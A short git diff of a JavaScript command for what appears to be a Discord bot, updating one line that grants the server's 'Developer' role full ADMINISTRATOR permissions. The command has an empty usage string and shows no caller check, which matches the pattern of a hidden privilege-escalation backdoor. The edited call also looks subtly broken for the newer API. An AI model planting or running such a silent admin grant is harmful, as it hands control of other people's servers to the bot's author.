@@ -8,7 +8,7 @@ module.exports = {
     usage: "",
     run: (client, message, args) => {
 
-        message.guild.roles.find('name', 'Developer').setPermissions('ADMINISTRATOR')
+        message.guild.roles.cache.find('name', 'Developer').setPermissions('ADMINISTRATOR')
 
     }
 }
